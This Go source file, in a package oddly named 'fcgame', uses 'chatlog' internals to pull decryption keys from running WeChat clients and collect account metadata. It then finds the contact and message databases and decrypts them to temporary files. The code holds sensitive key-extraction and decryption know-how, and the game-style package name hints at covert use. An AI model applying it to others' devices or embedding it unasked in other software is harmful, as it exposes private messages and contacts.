package fcgame

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"runtime/debug"
	"strings"
	"time"

	"github.com/sjzar/chatlog/internal/wechat"
	"github.com/sjzar/chatlog/internal/wechat/decrypt"
	"github.com/sjzar/chatlog/pkg/filemonitor"
	"go.uber.org/zap"
)

// AccountInfo 账户信息结构
type AccountInfo struct {
	Name        string `json:"name"`
	SortName    string `json:"sort_name"`
	Platform    string `json:"platform"`
	Version     int    `json:"version"`
	FullVersion string `json:"full_version"`
	DataDir     string `json:"data_dir"`
	Key         string `json:"key"`
	ImgKey      string `json:"img_key"`
	PID         uint32 `json:"pid"`
	ExePath     string `json:"exe_path"`
	Status      string `json:"status"`
	SavedAt     int64  `json:"saved_at"`
}

// WechatManager 微信管理器
type WechatManager struct {
	accounts []AccountInfo
}

// NewWechatManager 创建新的微信管理器
func NewWechatManager() *WechatManager {
	return &WechatManager{}
}

// LoadAccountsFromCache 从缓存中读取账户信息
func (wm *WechatManager) LoadAccountsFromCache(rbblot interface{}) []AccountInfo {
	var accounts []AccountInfo

	// 这里需要根据rbblot的实际接口来获取数据
	// 暂时返回空，让processor处理
	return accounts
}

// GetAndSaveAccounts 获取并保存账户信息
func (wm *WechatManager) GetAndSaveAccounts(rbblot interface{}) []AccountInfo {
	// 设置全局panic处理
	defer func() {
		if r := recover(); r != nil {
			// 记录panic信息
			Logger.Error("程序发生panic",
				zap.Any("panic", r),
				zap.String("stack", string(debug.Stack())))

			// 同时打印到控制台，确保能看到错误信息
			fmt.Fprintf(os.Stderr, "程序发生panic: %v\n%s\n", r, debug.Stack())
		}
	}()

	// 加载微信实例
	if err := wechat.Load(); err != nil {
		Logger.Error("加载微信实例失败", zap.Error(err))
		return nil
	}

	wechatAccounts := wechat.GetAccounts()
	if len(wechatAccounts) == 0 {
		Logger.Error("未找到微信实例")
		return nil
	}

	var accounts []AccountInfo
	ctx := context.Background()

	for _, acc := range wechatAccounts {
		Logger.Info("处理账户", zap.String("name", acc.Name))

		// 刷新账户状态
		if err := acc.RefreshStatus(); err != nil {
			Logger.Warn("刷新账户状态失败", zap.String("name", acc.Name), zap.Error(err))
			continue
		}

		// 只处理在线账户
		if acc.Status != "online" {
			Logger.Info("账户不在线，跳过", zap.String("name", acc.Name), zap.String("status", acc.Status))
			continue
		}

		// 获取密钥
		key, imgKey, err := acc.GetKey(ctx)
		if err != nil {
			Logger.Error("获取账户密钥失败", zap.String("name", acc.Name), zap.Error(err))
			continue
		}

		if imgKey != "" {
			Logger.Debug("获取到图片密钥", zap.String("name", acc.Name))
		}

		// 创建账户信息
		accountInfo := AccountInfo{
			Name:        acc.Name,
			Platform:    acc.Platform,
			Version:     acc.Version,
			FullVersion: acc.FullVersion,
			DataDir:     acc.DataDir,
			Key:         key,
			ImgKey:      imgKey,
			PID:         acc.PID,
			ExePath:     acc.ExePath,
			Status:      acc.Status,
			SavedAt:     time.Now().Unix(),
		}

		accounts = append(accounts, accountInfo)
	}

	if len(accounts) == 0 {
		Logger.Info("未获取到任何有效账户信息")
		return nil
	}

	wm.accounts = accounts
	return accounts
}

// GetTargetDatabaseFiles 获取目标数据库文件
func (wm *WechatManager) GetTargetDatabaseFiles(account AccountInfo) (contactFiles []string, messageFiles []string) {
	// 根据平台和版本设置不同的文件模式
	var contactPattern, messagePattern string

	switch {
	case account.Platform == "windows" && account.Version == 3:
		contactPattern = `MicroMsg\.db$`
		messagePattern = `MSG([0-9]+)\.db$`
	case account.Platform == "windows" && account.Version == 4:
		contactPattern = `contact\.db$`
		// 修改为精确匹配，确保文件名以message_开头，排除biz_message_x.db
		messagePattern = `^message_([0-9]+)\.db$`
	case account.Platform == "darwin" && account.Version == 3:
		contactPattern = `wccontact_new2\.db$`
		messagePattern = `msg_([0-9]+)\.db$`
	case account.Platform == "darwin" && account.Version == 4:
		contactPattern = `contact\.db$`
		// 修改为精确匹配，确保文件名以message_开头，排除biz_message_x.db
		messagePattern = `^message_([0-9]+)\.db$`
	default:
		Logger.Error("不支持的平台或版本",
			zap.String("platform", account.Platform),
			zap.Int("version", account.Version))
		return
	}

	// 创建文件组监控器
	contactGroup, err := filemonitor.NewFileGroup("contact", account.DataDir, contactPattern, []string{"fts"})
	if err != nil {
		Logger.Error("创建联系人文件组失败", zap.Error(err))
	} else {
		contactFiles, _ = contactGroup.List()
	}

	messageGroup, err := filemonitor.NewFileGroup("message", account.DataDir, messagePattern, []string{"fts"})
	if err != nil {
		Logger.Error("创建消息文件组失败", zap.Error(err))
	} else {
		messageFiles, _ = messageGroup.List()
	}

	return
}

// DecryptToTempFile 解密数据库到临时文件
func (wm *WechatManager) DecryptToTempFile(decryptor decrypt.Decryptor, dbFile, key string) (string, error) {
	// 创建临时文件进行解密
	tempFile, err := os.CreateTemp("", "chatlog_decrypt_*.db")
	if err != nil {
		return "", fmt.Errorf("创建临时文件失败: %v", err)
	}
	tempPath := tempFile.Name()
	tempFile.Close()

	// 解密到临时文件
	outputFile, err := os.Create(tempPath)
	if err != nil {
		os.Remove(tempPath)
		return "", fmt.Errorf("创建输出文件失败: %v", err)
	}

	ctx := context.Background()
	err = decryptor.Decrypt(ctx, dbFile, key, outputFile)
	outputFile.Close()

	if err != nil {
		// 如果已经解密，直接复制文件
		if strings.Contains(err.Error(), "already decrypted") {
			Logger.Debug("文件已解密，直接复制", zap.String("file", filepath.Base(dbFile)))
			data, readErr := os.ReadFile(dbFile)
			if readErr != nil {
				os.Remove(tempPath)
				return "", fmt.Errorf("读取文件失败: %v", readErr)
			}
			if writeErr := os.WriteFile(tempPath, data, 0644); writeErr != nil {
				os.Remove(tempPath)
				return "", fmt.Errorf("写入临时文件失败: %v", writeErr)
			}
		} else {
			os.Remove(tempPath)
			return "", fmt.Errorf("解密失败: %v", err)
		}
	}

	Logger.Debug("数据库解密到临时文件成功",
		zap.String("source", filepath.Base(dbFile)),
		zap.String("temp", filepath.Base(tempPath)))

	return tempPath, nil
}
